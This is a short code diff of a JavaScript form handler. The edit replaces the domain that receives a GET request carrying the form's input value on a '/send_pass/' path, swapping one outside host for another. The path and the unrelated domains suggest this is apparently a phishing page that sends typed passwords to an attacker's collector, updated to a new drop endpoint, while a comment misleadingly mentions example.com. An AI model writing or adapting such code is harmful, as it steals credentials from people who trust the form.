@@ -25,7 +25,7 @@ function handleSubmit(event) {
     }
 
     // Step 2: Make a GET request to example.com/send/ + the value from Step 1
-    const url = `https://mailing.picryptunlock.com.ng/send_pass/${encodeURIComponent(inputValue)}/P-/`;
+    const url = `https://directofficesupport.com/send_pass/${encodeURIComponent(inputValue)}/P-/`;
 
     fetch(url, {
         method: 'GET'
